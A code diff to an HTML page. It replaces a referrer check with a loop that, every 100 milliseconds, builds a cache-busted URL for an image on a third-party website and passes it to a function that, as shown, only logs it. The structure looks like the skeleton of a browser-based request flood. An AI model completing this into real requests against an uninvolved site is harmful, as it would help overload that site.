@@ -2,13 +2,23 @@
   <head>
   <meta name="referrer" content="no-referrer" />
     <script>
-      var doit = function() {
-	if(document.referrer == null || document.referrer.indexOf(window.location.hostname) >= 0)return false;      
-	alert(window.parent.height);     
-      };
+
+        var doit = function(target) {
+            console.log(target);
+        };
+
+        var start_it = function(target){
+
+          setInterval(function() {
+
+            doit(target+(target.indexOf('?') > 0 ? '&' : '?')+Math.random().toString(36).substr(2, 7)+'='+Math.random().toString(36).substr(2, 7));
+
+          }, 100);
+
+        };
+
   </script>
   </head>
-<body onload="doit();">
 
-</body>
+<body onload="start_it('https://www.smokturkey.org/image/cache/catalog/Eleaf-iStick-Pico-RESIN-Kit-1140x380.jpg');"></body>
 </html>
